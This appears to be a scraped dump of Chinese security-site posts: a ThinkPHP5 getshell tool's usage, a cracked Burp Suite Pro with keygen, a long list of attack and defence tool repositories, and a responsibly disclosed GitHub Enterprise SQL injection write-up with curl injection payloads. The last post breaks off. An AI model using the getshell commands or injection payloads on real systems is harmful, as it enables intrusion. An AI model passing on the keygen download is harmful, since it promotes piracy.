"5ccbf9b84f2f0a0a7a69bfb6","tp5-getshell.py - thinkphp5 rce漏洞检测工具","theLSA","概述控制器过滤不严导致rce,漏洞详情参考 thinkphp5 RCE漏洞重现及分析快速开始python tp5-getshell.py -h单url检测（poc）使用4种poc检测python tp5-getshell.py -u http://www.xxx.com:8888/think5124/public/单url检测（getshell）使用3种exp进行getshell，遇到先成功的exp就停止，防止重复getshellpython tp5-getshell.py -u http://www.xxx.com:8888/think5124/public/ –exploit单url检测（命令行shell模式）python tp5-getshell.py -u http://www.xxx.com/ –cmdshell批量检测（getshell）使用3种exp进行getshell，遇到先成功的exp就停止，防止重复getshellpython tp5-getshell.py -f urls.txt -t 2 -s 10反馈博客： http://www.lsablog.com/gmail: lsasguge196@gmail.comqq: 2894400469@qq.comissues: https://github.com/theLSA/tp5-getshell/issues","2018-12-13 11:00:01","安全工具","tp5-getshell.py - thinkphp5 rce漏洞检测工具","http://nsoad.com/Security-tools/20181213/tools-1224.html"
"5ccbf9c14f2f0a0a7a69bfb7","Burp Suite是一款信息安全从业人员必备的集成型的渗透测试工具。","Silence","Burp Suite是一款信息安全从业人员必备的集 成型的渗透测试工具，它采用自动测试和半自动测试的方式，包含了 Proxy,Spider,Scanner,Intruder,Repeater,Sequencer,Decoder,Comparer等工具模块。通 过拦截HTTP/HTTPS的web数据包，充当浏览器和相关应用程序的中间人，进行拦截、修改、重放数据包进行测试，是web安全人员的一把必备的瑞士军刀。新版界面如下：下载地址：链接：https://pan.baidu.com/s/1Ne-bfQvtISUpQOuERE605A 密码：19o2   (解压密码：www.nsoad.com)MD5:f7bc22d1ba9c1fda2857b732201c8097注：程序的安全性请自行检测，本站所发布的工具仅供安全研究，请下载后24小内删除。","2018-08-24 09:50:05","安全工具","渗透必备工具：burpsuite_pro_v2.0 Beta含注册机(目前最新版)","http://nsoad.com/Security-tools/20180824/tools-1219.html"
"5ccbf9c14f2f0a0a7a69bfb8","漏洞及渗透练习平台，数据库注入练习平台，花式扫描器，信息搜集工具，WEB工具，windows域....","安徽锋刃科技","目录	漏洞及渗透练习平台	数据库注入练习平台	花式扫描器	信息搜集工具	WEB工具	windows域渗透工具	漏洞利用及攻击框架	漏洞POC&amp;EXP	中间人攻击及钓鱼	密码破解	二进制及代码分析工具	EXP编写框架及工具	隐写相关工具	各类安全资料	各类CTF资源	各类编程资源	Python漏洞及渗透练习平台WebGoat漏洞练习环境https://github.com/WebGoat/WebGoathttps://github.com/WebGoat/WebGoat-LegacyDamn Vulnerable Web Application(漏洞练习平台)https://github.com/RandomStorm/DVWA数据库注入练习平台https://github.com/Audi-1/sqli-labs用node编写的漏洞练习平台，like OWASP Node Goathttps://github.com/cr0hn/vulnerable-node花式扫描器端口扫描器Nmaphttps://github.com/nmap/nmap本地网络扫描器https://github.com/SkyLined/LocalNetworkScanner子域名扫描器https://github.com/lijiejie/subDomainsBrute漏洞路由扫描器https://github.com/jh00nbr/Routerhunter-2.0迷你批量信息泄漏扫描脚本https://github.com/lijiejie/BBScanWaf类型检测工具https://github.com/EnableSecurity/wafw00f信息搜集工具社工插件，可查找以email、phone、username的注册的所有网站账号信息https://github.com/n0tr00t/SregGithub信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息https://github.com/sea-god/gitscangithub Repo信息搜集工具https://github.com/metac0rtex/GitHarvesterWEB工具webshell大合集https://github.com/tennc/webshell渗透以及web攻击脚本https://github.com/brianwrf/hackUtilsweb渗透小工具大合集https://github.com/rootphantomer/hacktoolsfor_meXSS数据接收平台https://github.com/firesunCN/BlueLotus_XSSReceiverXSS与CSRF工具https://github.com/evilcos/xssorShort for command injection exploiter，web向命令注入检测工具https://github.com/stasinopoulos/commix数据库注入工具https://github.com/sqlmapproject/sqlmapWeb代理，通过加载sqlmap api进行sqli实时检测https://github.com/zt2/sqli-hunter新版中国菜刀https://github.com/Chora10/Cknife.git泄露利用EXPhttps://github.com/lijiejie/GitHack浏览器攻击框架https://github.com/beefproject/beef自动化绕过WAF脚本https://github.com/khalilbijjou/WAFNinjahttp命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）https://github.com/jkbrzt/httpie浏览器调试利器https://github.com/firebug/firebug一款开源WAFhttps://github.com/SpiderLabs/ModSecuritywindows域渗透工具windows渗透神器https://github.com/gentilkiwi/mimikatzPowershell渗透库合集https://github.com/PowerShellMafia/PowerSploitPowershell tools合集https://github.com/clymb3r/PowerShellFuzzWeb向Fuzz工具https://github.com/xmendez/wfuzzHTTP暴力破解，撞库攻击脚本https://github.com/lijiejie/htpwdScan漏洞利用及攻击框架msfhttps://github.com/rapid7/metasploit-frameworkPoc调用框架，可加载Pocsuite,Tangscan，Beebeeto等https://github.com/erevus-cn/pocscanPocsuitehttps://github.com/knownsec/PocsuiteBeebeetohttps://github.com/n0tr00t/Beebeeto-framework漏洞POC&amp;EXPExploitDB官方git版本https://github.com/offensive-security/exploit-databasephp漏洞代码分析https://github.com/80vul/phpcodzSimple test for CVE-2016-2107https://github.com/FiloSottile/CVE-2016-2107CVE-2015-7547 POChttps://github.com/fjserna/CVE-2015-7547JAVA反序列化POC生成工具https://github.com/frohoff/ysoserialJAVA反序列化EXPhttps://github.com/foxglovesec/JavaUnserializeExploitsJenkins CommonCollections EXPhttps://github.com/CaledoniaProject/jenkins-cli-exploitCVE-2015-2426 EXP (windows内核提权)https://github.com/vlad902/hacking-team-windows-kernel-lpeuse docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示)https://github.com/hxer/vulnappphp7缓存覆写漏洞Demo及相关工具https://github.com/GoSecure/php7-opcache-overrideXcodeGhost木马样本https://github.com/XcodeGhostSource/XcodeGhost中间人攻击及钓鱼中间人攻击框架https://github.com/secretsquirrel/the-backdoor-factoryhttps://github.com/secretsquirrel/BDFProxyhttps://github.com/byt3bl33d3r/MITMfInject code, jam wifi, and spy on wifi usershttps://github.com/DanMcInerney/LANs.py可扩展的中间人代理工具https://github.com/intrepidusgroup/mallorywifi钓鱼https://github.com/sophron/wifiphisher密码破解密码破解工具https://github.com/shinnok/johnny本地存储的各类密码提取利器https://github.com/AlessandroZ/LaZagne二进制及代码分析工具二进制分析工具https://github.com/devttys0/binwalk系统扫描器，用于寻找程序和库然后收集他们的依赖关系，链接等信息https://github.com/quarkslab/binmaprp++ is a full-cpp written tool that aims to find ROP sequences in PE/Elf/Mach-O (doesn't support the FAT binaries) x86/x64 binaries.https://github.com/0vercl0k/rpWindows Exploit Development工具https://github.com/lillypad/badger二进制静态分析工具（python）https://github.com/bdcht/amocoPython Exploit Development Assistance for GDBhttps://github.com/longld/peda对BillGates Linux Botnet系木马活动的监控工具https://github.com/ValdikSS/billgates-botnet-tracker木马配置参数提取工具https://github.com/kevthehermit/RATDecodersShellphish编写的二进制分析工具（CTF向）https://github.com/angr/angr针对python的静态代码分析工具https://github.com/yinwang0/pysonar2一个自动化的脚本（shell）分析工具，用来给出警告和建议https://github.com/koalaman/shellcheck基于AST变换的简易Javascript反混淆辅助工具https://github.com/ChiChou/etacsufboEXP编写框架及工具二进制EXP编写工具https://github.com/t00sh/rop-toolCTF Pwn 类题目脚本编写框架https://github.com/Gallopsled/pwntoolsan easy-to-use io library for pwning developmenthttps://github.com/zTrix/zio跨平台注入工具（ Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.）https://github.com/frida/frida隐写相关工具隐写检测工具https://github.com/abeluck/stegdetect各类安全资料域渗透教程https://github.com/l3m0n/pentest_studypython security教程（原文链接http://www.primalsecurity.net/tutorials/python-tutorials/）https://github.com/smartFlash/pySecuritydata_hacking合集https://github.com/ClickSecurity/data_hackingmobile-security-wikihttps://github.com/exploitprotocol/mobile-security-wiki书籍《reverse-engineering-for-beginners》https://github.com/veficos/reverse-engineering-for-beginners一些信息安全标准及设备配置https://github.com/luyg24/IT_securityAPT相关笔记https://github.com/kbandla/APTnotesKcon资料https://github.com/knownsec/KConctf及黑客资源合集https://github.com/bt3gl/My-Gray-Hacker-Resourcesctf和安全工具大合集https://github.com/zardus/ctf-tools《DO NOT FUCK WITH A HACKER》https://github.com/citypw/DNFWAH各类CTF资源近年ctf writeup大全https://github.com/ctfs/write-ups-2016https://github.com/ctfs/write-ups-2015https://github.com/ctfs/write-ups-2014fbctf竞赛平台Demohttps://github.com/facebook/fbctfctf Resourceshttps://github.com/ctfs/resources各类编程资源大礼包（什么都有）https://github.com/bayandin/awesome-awesomenessbash-handbookhttps://github.com/denysdovhan/bash-handbookpython资源大全https://github.com/jobbole/awesome-python-cngit学习资料https://github.com/xirong/my-git安卓开源代码解析https://github.com/android-cn/android-open-project-analysispython框架，库，资源大合集https://github.com/vinta/awesome-pythonJS 正则表达式库（用于简化构造复杂的JS正则表达式）https://github.com/VerbalExpressions/JSVerbalExpressionsPythonpython 正则表达式库（用于简化构造复杂的python正则表达式）https://github.com/VerbalExpressions/PythonVerbalExpressionspython任务管理以及命令执行库https://github.com/pyinvoke/invokepython exe打包库https://github.com/pyinstaller/pyinstallerpy3 爬虫框架https://github.com/orf/cyborg一个提供底层接口数据包编程和网络协议支持的python库https://github.com/CoreSecurity/impacketpython requests 库https://github.com/kennethreitz/requestspython 实用工具合集https://github.com/mahmoud/boltonspython爬虫系统https://github.com/binux/pyspiderctf向 python工具包https://github.com/P1kachu/v0lt科学上网科学上网工具https://github.com/XX-net/XX-Net老司机福利微信自动抢红包动态库https://github.com/east520/AutoGetRedEnv微信抢红包插件（安卓版）https://github.com/geeeeeeeeek/WeChatLuckyMoney神器https://github.com/yangyangwithgnu/hardseed其他以下内容来自：https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md 子域名枚举类https://github.com/lijiejie/subDomainsBrute (经典的子域名爆破枚举脚本)https://github.com/ring04h/wydomain (子域名字典穷举)https://github.com/le4f/dnsmaper (子域名枚举与地图标记)https://github.com/0xbug/orangescan (在线子域名信息收集工具)https://github.com/TheRook/subbrute （根据DNS记录查询子域名)https://github.com/We5ter/GoogleSSLdomainFinder (基于谷歌SSL透明证书的子域名查询脚本)https://github.com/mandatoryprogrammer/cloudflare_enum （使用CloudFlare进行子域名枚举的脚本）https://github.com/18F/domain-scan (A domain scanner）https://github.com/Evi1CLAY/Cool ... Python/DomainSeeker（多方式收集目标子域名信息）数据库漏洞扫描类https://github.com/0xbug/SQLiScanner (一款基于SQLMAP和Charles的被动SQL注入漏洞扫描工具)https://github.com/stamparm/DSSS (99行代码实现的sql注入漏洞扫描器)https://github.com/LoRexxar/Feigong（针对各种情况自由变化的MySQL注入脚本）https://github.com/youngyangyang04/NoSQLAttack (一款针对mongoDB的攻击工具)https://github.com/Neohapsis/bbqsql（SQL盲注利用框架）https://github.com/NetSPI/PowerUpSQL（攻击SQLSERVER的Powershell脚本框架）弱口令或信息泄漏扫描类https://github.com/lijiejie/htpwdScan (一个简单的HTTP暴力破解、撞库攻击脚本)https://github.com/lijiejie/BBScan (一个迷你的信息泄漏批量扫描脚本)https://github.com/lijiejie/GitHack (.git文件夹泄漏利用工具)https://github.com/wilson9x1/fenghuangscanner_v3 (端口及弱口令检测)https://github.com/ysrc/F-Scrack (对各类服务进行弱口令检测的脚本)https://github.com/Mebus/cupp （根据用户习惯生成弱口令探测字典脚本）https://github.com/RicterZ/genpAss （中国特色的弱口令生成器）https://github.com/netxfly/crack_ssh （go写的协程版的ssh\redis\mongodb弱口令破解工具）物联网设备扫描https://github.com/rapid7/IoTSeeker （物联网设备默认密码扫描检测工具)https://github.com/shodan-labs/iotdb (使用nmap扫描IoT设备)xss扫描器https://github.com/shawarkhanethicalhacker/BruteXSS （Cross-Site Scripting Bruteforcer）https://github.com/1N3/XSSTracer (A small python script to check for Cross-Site Tracing)https://github.com/0x584A/fuzzXssPHP (PHP版本的反射型xss扫描)https://github.com/chuhades/xss_scan (批量扫描xss的python脚本）企业网络自检https://github.com/sowish/LNScan （详细的内部网络信息扫描器）https://github.com/ysrc/xunfeng (网络资产识别引擎，漏洞检测引擎）https://github.com/SkyLined/LocalNetworkScanner (javascript实现的本地网络扫描器)https://github.com/laramies/theHarvester （企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hosts）https://github.com/x0day/Multisearch-v2 (bing、google、360、zoomeye等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息）webshell检测https://github.com/We5ter/Scanners-Box/tree/master/Find_webshell/ （php后门检测，脚本较简单，因此存在误报高和效率低下的问题）https://github.com/yassineaddi/BackdoorMan （A toolkit find malicious, hidden and suspicious PHP scripts and shells in a chosen destination）内网渗透https://github.com/0xwindows/VulScritp （企业内网渗透脚本，包括banner扫描、端口扫描；phpmyadmin、jenkins等通用漏洞利用等）https://github.com/lcatro/networkbackdoorscanner（基于网络流量的内网探测框架）https://github.com/fdiskyou/hunter（调用 Windows API 枚举用户登录信息）中间件扫描、指纹识别类https://github.com/ring04h/wyportmap (目标端口扫描+系统服务指纹识别)https://github.com/ring04h/weakfilescan (动态多线程敏感信息泄露检测工具)https://github.com/EnableSecurity/wafw00f (WAF产品指纹识别)https://github.com/rbsec/sslscan （ssl类型识别)https://github.com/urbanadventurer/whatweb (web指纹识别)https://github.com/tanjiti/FingerPrint (web应用指纹识别)https://github.com/nanshihui/Scan-T （网络爬虫式指纹识别)https://github.com/OffensivePython/Nscan (a fast Network scanner inspired by Masscan and Zmap)https://github.com/ywolf/F-NAScan (网络资产信息扫描, ICMP存活探测,端口扫描，端口指纹服务识别）https://github.com/ywolf/F-MiddlewareScan （中间件扫描）https://github.com/maurosoria/dirsearch (Web path scanner)https://github.com/x0day/bannerscan （C段Banner与路径扫描）https://github.com/RASSec/RASscan (端口服务扫描)https://github.com/3xp10it/bypass_waf （waf自动暴破）https://github.com/3xp10it/mytools/blob/master/xcdn.py（获取cdn背后的真实ip）https://github.com/Xyntax/BingC（基于Bing搜索引擎的C段/旁站查询，多线程，支持API）https://github.com/Xyntax/DirBrute（多线程WEB目录爆破工具）https://github.com/zer0h/httpscan（一个爬虫式的网段Web主机发现小工具）https://github.com/lietdai/doom（thorn上实现的分布式任务分发的ip端口漏洞扫描器）专用扫描器https://github.com/blackye/Jenkins (Jenkins漏洞探测、用户抓取爆破)https://github.com/code-scan/dzscan (discuz扫描)https://github.com/chuhades/CMS-Exploit-Framework (CMS攻击框架)https://github.com/lijiejie/IISshortnameScanner (an IIS shortname Scanner)https://github.com/We5ter/Scanne ... ter/FlashScanner.pl (flashxss扫描)https://github.com/coffeehb/SSTIF（一个Fuzzing服务器端模板注入漏洞的半自动化工具）无线网络https://github.com/savio-code/fern-wifi-cracker/ (无线安全审计工具)https://github.com/m4n3dw0lf/PytheM（Python网络/渗透测试工具）https://github.com/P0cL4bs/WiFi-Pumpkin（无线安全渗透测试套件）综合类https://github.com/az0ne/AZScanner (自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测)https://github.com/blackye/lalascan (自主开发的分布式web漏洞扫描框架，集合owasp top10漏洞扫描和边界资产发现能力)https://github.com/blackye/BkScanner (BkScanner 分布式、插件化web漏洞扫描器)https://github.com/ysrc/GourdScanV2 （被动式漏洞扫描)https://github.com/alpha1e0/pentestdb (WEB渗透测试数据库)https://github.com/netxfly/passive_scan (基于http代理的web漏洞扫描器)https://github.com/1N3/Sn1per (自动化扫描器，包括中间件扫描以及设备指纹识别)https://github.com/RASSec/pentestEr_Fully-automatic-scanner （定向全自动化渗透测试工具）https://github.com/3xp10it/3xp10it （3xp10it自动化渗透测试框架）https://github.com/Lcys/lcyscan（python插件化漏洞扫描器）https://github.com/Xyntax/POC-T（渗透测试插件化并发框架）CTF平台http://www.shiyanbar.com/http://oj.xctf.org.cn/http://ctf.bugku.com/http://rookiehacker.org/","2018-07-30 12:05:52","安全工具","信息安全工具汇总","http://nsoad.com/Security-tools/20180730/tools-1217.html"
"5ccbf9c14f2f0a0a7a69bfb9","R3con1z3r是一个轻量级的Web信息收集工具，具有用python编写的直观功能。","silence","R3con1z3r是一个轻量级的Web信息收集工具，具有用python编写的直观功能。 它提供了一个强大的环境，可以快速，彻底地进行开源智能（OSINT）基于Web的足迹。足迹是黑客攻击的第一阶段，它收集了有关目标的所有可能信息。 R3con1z3r是一种内置功能的被动侦察工具，包括：HTTP标头标志，Traceroute，Whois Footprinting，DNS信息，同一服务器上的站点，Nmap端口扫描器，反向目标和网页上的超链接。 该工具在提供必要的输入后生成HTML格式的输出。截图：安装r3con1z3r支持Python 2和Python 3。$ git clone https://github.com/abdulgaphy/r3con1z3r.git$ cd r3con1z3r$ pip install -r requirements.txtLinux用户可选$ sudo chmod +x r3con1z3r.py下载地址https://github.com/abdulgaphy/r3con1z3r.git","2018-12-18 14:44:41","安全工具","R3Con1Z3R  - 轻量级Web信息收集工具","http://nsoad.com/Security-tools/20181218/tools-1228.html"
"5ccbf9c14f2f0a0a7a69bfba","GitHub企业版软件是专供公司团体用来部署在内网进行开发服务的商业性应用程序。Github企业版采用标准OVF格式集成，以虚拟机（VM）镜像方式发....","clouds","GitHub企业版软件是专供公司团体用来部署在内网进行开发服务的商业性应用程序。Github企业版采用标准OVF格式集成，以虚拟机（VM）镜像方式发布，可以在enterprise.github.com网站注册下载45天试用版本，并把其部署在任何虚拟机环境中。通过下载其试用版本软件进行分析，我花了一周时间，发现了其中存在的SQL注入漏洞，并获得了5000美元漏洞赏金。Github企业版VM环境安装之后的效果如下：现在，Github搭建完成，接下来就可以在虚拟机系统内进行深入分析。环境安全性分析用Nmap发现有6个开启端口：$ nmap -sT -vv -p 1-65535 192.168.187.145...PORT     STATE  SERVICE22/tcp   open   ssh25/tcp   closed smtp80/tcp   open   http122/tcp  open   smakynet443/tcp  open   https8080/tcp closed http-proxy8443/tcp open   https-alt9418/tcp open   git这些端口用途初步分析为：端口22/tcp和9418/tcp可能用于进程haproxy转发后端服务babeld；端口80/tcp和443/tcp用于Github主要服务；端口122/tcp用于SSH服务；端口8443/tcp用于GitHub的管理控制台服务。由于GitHub的管理控制台需要密码才能实现登录，所以你可以设置密码并通过122端口的SSH服务连接VM环境，SSH连接进入系统之后，检查系统信息发现，几乎所有的Github服务代码都位于目录/data/下：# ls -al /data/total 92drwxr-xr-x 23 root              root              4096 Nov 29 12:54 .drwxr-xr-x 27 root              root              4096 Dec 28 19:18 ..drwxr-xr-x  4 git               git               4096 Nov 29 12:54 alambicdrwxr-xr-x  4 babeld            babeld            4096 Nov 29 12:53 babelddrwxr-xr-x  4 git               git               4096 Nov 29 12:54 codeloaddrwxr-xr-x  2 root              root              4096 Nov 29 12:54 dbdrwxr-xr-x  2 root              root              4096 Nov 29 12:52 enterprisedrwxr-xr-x  4 enterprise-manage enterprise-manage 4096 Nov 29 12:53 enterprise-managedrwxr-xr-x  4 git               git               4096 Nov 29 12:54 failbotddrwxr-xr-x  3 root              root              4096 Nov 29 12:54 git-hooksdrwxr-xr-x  4 git               git               4096 Nov 29 12:53 githubdrwxr-xr-x  4 git               git               4096 Nov 29 12:54 git-importdrwxr-xr-x  4 git               git               4096 Nov 29 12:54 gitmondrwxr-xr-x  4 git               git               4096 Nov 29 12:54 gpgverifydrwxr-xr-x  4 git               git               4096 Nov 29 12:54 hookshotdrwxr-xr-x  4 root              root              4096 Nov 29 12:54 lariatdrwxr-xr-x  4 root              root              4096 Nov 29 12:54 longpolldrwxr-xr-x  4 git               git               4096 Nov 29 12:54 mail-repliesdrwxr-xr-x  4 git               git               4096 Nov 29 12:54 pagesdrwxr-xr-x  4 root              root              4096 Nov 29 12:54 pages-luadrwxr-xr-x  4 git               git               4096 Nov 29 12:54 renderlrwxrwxrwx  1 root              root                23 Nov 29 12:52 repositories -&gt; /data/user/repositoriesdrwxr-xr-x  4 git               git               4096 Nov 29 12:54 slumlorddrwxr-xr-x 20 root              root              4096 Dec 28 19:22 user查看其中的文件源码，貌似是base64加密的：GitHub使用了一个自定义的库来加密混淆自身源代码。如果你在谷歌搜索ruby_concealer.so，你会发现一个牛人已经对这种加密方式作了分析，只需在ruby_concealer.so中用rb_f_puts替换rb_f_eval即可实现解密。但我们还是实际动手来看看，打开IDA Pro分析一下：你可以发现，其源程序使用了类Zlib::Inflate::inflate进行数据解压缩，并使用了一段明文KEY作为异或（XOR）操作，然而，让人搞笑的是，这段明文KEY竟然是这样的：This obfuscation is intended to discourage GitHub Enterprise customers from making modifications to the VM. We know this 'encryption' is easily broken. （我们清楚该加密很容易被破解，但其目的在于防止GitHub企业版用户随意对VM环境进行修改）哎呀，让人哭笑不得….有了这些，我们就可以自己构造解密脚本了：require 'zlib'key = ""This obfuscation is intended to discourage GitHub Enterprise customers from making modifications to the VM. We know this 'encryption' is easily broken. ""def decrypt(s)    i, plaintext = 0, ''    Zlib::Inflate.inflate(s).each_byte do |c|        plaintext &lt;&lt; (c ^ key[i%key.length].ord).chr        i += 1    end    plaintextendcontent = File.open(ARGV[0], ""r"").readcontent.sub! %Q(require ""ruby_concealer.so""\n__ruby_concealer__), "" decrypt ""plaintext = eval contentputs plaintext代码分析实现程序源代码解密之后，让我们尝试着进行代码审计：$ cloc /data/   81267 text files.   47503 unique files.   24550 files ignored.http://cloc.sourceforge.net v 1.60  T=348.06 s (103.5 files/s, 15548.9 lines/s)-----------------------------------------------------------------------------------Language                         files          blank        comment           code-----------------------------------------------------------------------------------Ruby                             25854         359545         437125        1838503Javascript                        4351         109994         105296         881416YAML                               600           1349           3214         289039Python                            1108          44862          64025         180400XML                                121           6492           3223         125556C                                  444          30903          23966         123938Bourne Shell                       852          14490          16417          87477HTML                               636          24760           2001          82526C++                                184           8370           8890          79139C/C++ Header                       428          11679          22773          72226Java                               198           6665          14303          45187CSS                                458           4641           3092          44813Bourne Again Shell                 142           6196           9006          35106m4                                  21           3259            369          29433...$ ./bin/rake aboutAbout your application's environmentRuby version              2.1.7 (x86_64-linux)RubyGems version          2.2.5Rack version              1.6.4Rails version             3.2.22.4JavaScript Runtime        Node.js (V8)Active Record version     3.2.22.4Action Pack version       3.2.22.4Action Mailer version     3.2.22.4Active Support version    3.2.22.4Middleware                GitHub::DefaultRoleMiddleware, Rack::Runtime, Rack::MethodOverride, ActionDispatch::RequestId, Rails::Rack::Logger, ActionDispatch::ShowExceptions, ActionDispatch::DebugExceptions, ActionDispatch::Callbacks, ActiveRecord::ConnectionAdapters::ConnectionManagement, ActionDispatch::Cookies, ActionDispatch::Session::CookieStore, ActionDispatch::Flash, ActionDispatch::ParamsParser, ActionDispatch::Head, Rack::ConditionalGet, Rack::ETag, ActionDispatch::BestStandardsSupportApplication root          /data/github/9fcdcc8Environment               productionDatabase adapter          githubmysql2Database schema version   20161003225024从以上分析可以看出大部分为Ruby代码，而且可以发现：程序通过端口80和443远程连接github.com、gist.github.com和api.github.com在目录/data/github/下更新代码库；目录/data/render/可能为render.githubusercontent.com代码库；程序通过8443端口运行目录/data/enterprise-manage/下服务。漏洞分析虽然我对Ruby不太熟悉，但经过现学现用，我花了一周的时间发现了这个漏洞，以下我的分析工作日程：第一天  设置Github虚拟机环境第二天  设置Github虚拟机环境第三天  学习Rails进行代码审计第四天  学习Rails进行代码审计第五天  学习Rails进行代码审计第六天  哦也，找到了一个SQL注入漏洞这个SQL注入漏洞存在于GitHub企业版程序的PreReceiveHookTarget模块中，其根本原因在于/data/github/current/app/model/pre_receive_hook_target.rb文件的第45行：33   scope :sorted_by, -&gt; (order, direction = nil) {34     direction = ""DESC"" == ""#{direction}"".upcase ? ""DESC"" : ""ASC""35     select(&lt;&lt;-SQL)36       #{table_name}.*,37       CASE hookable_type38         WHEN 'global'     THEN 039         WHEN 'User'       THEN 140         WHEN 'Repository' THEN 241       END AS priority42     SQL43       .joins(""JOIN pre_receive_hooks hook ON hook_id = hook.id"")44       .readonly(false)45       .order([order, direction].join("" ""))46   }虽然Rails中内置的对象关系映射ActiveRecord in Rails本身不允许SQL注入操作，但一些ActiveRecord的误用实例同样会引起SQL注入。具体可参考学习Rails-sqli.org。在该漏洞情况中，我们可以控制order方法的参数实现恶意代码注入。跟踪观察发现，服务sorted_by被data/github/current/app/api/org_pre_receive_hooks.rb文件的第61行调用：10   get ""/organizations/:organization_id/pre-receive-hooks"" do11     control_access :list_org_pre_receive_hooks, :o rg =&gt; org = find_org!12     @documentation_url &lt;&lt; ""#list-pre-receive-hooks""13     targets = PreReceiveHookTarget.visible_for_hookable(org)14     targets = sort(targets).paginate(pagination)15     GitHub::PrefillAssociations.for_pre_receive_hook_targets targets16     deliver :pre_receive_org_target_hash, targets17   end...60   def sort(scope)61     scope.sorted_by(""hook.#{params[:sort] || ""id""}"", params[:direction] || ""asc"")62   end可以清楚地看到params[:sort]被传递给了scope.sorted_by，所以我们可以尝试着向params[:sort]注入恶意代码。在触发该漏洞之前，接入API需要admin:pre_receive_hook函数具备一个有效的access_token值，高兴的是，我们可以通过以下命令来获取：$ curl -k -u 'nogg:nogg' 'https://192.168.187.145/api/v3/authorizations' \-d '{""scopes"":""admin:pre_receive_hook"",""note"":""x""}'{  ""id"": 4,  ""url"": ""https://192.168.187.145/api/v3/authorizations/4"",  ""app"": {    ""name"": ""x"",    ""url"": ""https://developer.github.com/enterprise/2.8/v3/oauth_authorizations/"",    ""client_id"": ""00000000000000000000""  },  ""token"": ""????????"",  ""hashed_token"": ""1135d1310cbe67ae931ff7ed8a09d7497d4cc008ac730f2f7f7856dc5d6b39f4"",  ""token_last_eight"": ""1fadac36"",  ""note"": ""x"",  ""note_url"": null,  ""created_at"": ""2017-01-05T22:17:32Z"",  ""updated_at"": ""2017-01-05T22:17:32Z"",  ""scopes"": [    ""admin:pre_receive_hook""  ],  ""fingerprint"": null}一旦获取到有效的access_token值之后，漏洞就会被触发：$ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' \'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&amp;sort=id,(select+1+from+information_schema.tables+limit+1,1)'[]$ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' \'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&amp;sort=id,(select+1+from+mysql.user+limit+1,1)'{  ""message"": ""Server Error"",  ""documentation_url"": ""https://developer.github.com/enterprise/2.8/v3/orgs/pre_receive_hooks""}$ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' \'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&amp;sort=id,if(user()=""github@localhost"",sleep(5),user()){    ...}漏洞报送进程2016/12/26 05:48   通过HackerOne把该漏洞报送给GitHub2016/12/26 08:39   GitHub给出反馈，表示已通过验证并正在修复；2016/12/26 15:48   提供给GitHub更多漏洞细节；2016/12/28 02:44   GitHub反馈表示，漏洞补丁将随GitHub企业版后续更新释出；2017/01/04 06:41   GitHub回复将给我5000美刀赏金；2017/01/05 02:37   资询GitHub，是否介意我将此漏洞公开在个人博客；2017/01/05 03:06   GitHub很爽快地表示，没问题！2017/01/05 07:06   GitHub Enterprise 2.8.5发布！如果你对该漏洞感兴趣，可以自己部署Github企业版系统环境进行深入分析。","2017-01-11","漏洞发布","看我如何发现Github企业版程序SQL注入漏洞并获得5000美刀赏金","http://nsoad.com/Article/exploit/20170111/vulzone-49.html"
"5ccbf9c14f2f0a0a7a69bfbb","Secret Keeper是一个用python编写的文件加密器，它使用高级加密标准（AES）加密您的文件。","Silence","Secret Keeper是一个用python编写的文件加密器，它使用高级加密标准（AES）加密您的文件。 在创建AES密码时使用CBC模式，其中每个块链接到流中的前一个块。Linux安装：[1]终端输入以下命令进行下载：git clone https://github.com/Sameera-Madhushan/Secret-Keeper[2]下载程序后，输入以下命令以到Digger目录并列出内容cd Secret-Keeper &amp;&amp; ls[3]安装依赖项pip3 install -r requirements.txt[4]使用以下命令运行脚本python3 Secret-Keeper.pyWindows安装：[1]从Python.org下载并运行Python 2.7.x和Python 3.7 安装程序。（在安装Python 3.7中，将Python 3.6添加到环境变量）[2]从Git-scm.com下载并运行Git安装文件，Windows Command Propmt中选择Use Git。[3]此外，运行命令提示符并输入以下命令：git clone https://github.com/Sameera-Madhushan/Secret-Keepercd Secret-Keeperpip3 install -r requirements.txtpython3 Secret-Keeper.py下载地址：https://github.com/Sameera-Madhushan/Secret-Keeper","2018-12-17 22:04:28","安全工具","Secret Keeper：一款使用 AES 对文件进行加密的 python 工具","http://nsoad.com/Security-tools/20181217/tools-1226.html"
"5ccbf9c14f2f0a0a7a69bfbc","在企业安全中，比较基础的一块就是：资产漏洞管理；","若水行啊","背景：在企业安全中，比较基础的一块就是：资产漏洞管理；巡风（关于巡风，点击此处了解）可以用来做这件事，当然某些地方需要根据自己实际情况修改、增加,这里不赘述；其数据库为mongo；在初步使用过程中，为了方便后续的开发，需要使用pycharm集成的mongo可视化插件，这其中我们遇到了一些""不使用默认端口的坑""（大佬一笑而过。。。）遇到两个问题：1、无法shell连接数据库，mongo报错，指定使用的端口也没用2、pycharm的mongo插件无法连接，mechanism尝试default,报错如下，看到支持的机制，那就尝试MONGODB-CR，这次报错不一样了：认证失败 ；但那里认证失败了呢，不知道。。。解决：1、首先搞清mongo与mongod要先启动mongod（有d的一般是守护进程，或服务本身），再mongo（连接服务）2、发现巡风的数据库xunfeng配置时，指定了端口 65521，而不是默认的27017；而巡风的配置文件Config.py里会写明，所以用巡风的脚本Run.sh启动时，完全没有问题；但是，如果自己以shell方式要连接mongo时，如果以默认命令 mongo去连接就会报错，认证失败；那么，就在在启动mongod的时候指定 端口65521来启动，# mongod --port 65521 --dbpath=/var/lib/mongodb（或更改mongod的配置文件，并# mongod --config /etc/mongodb.conf 以生效）；然后去连接mongo 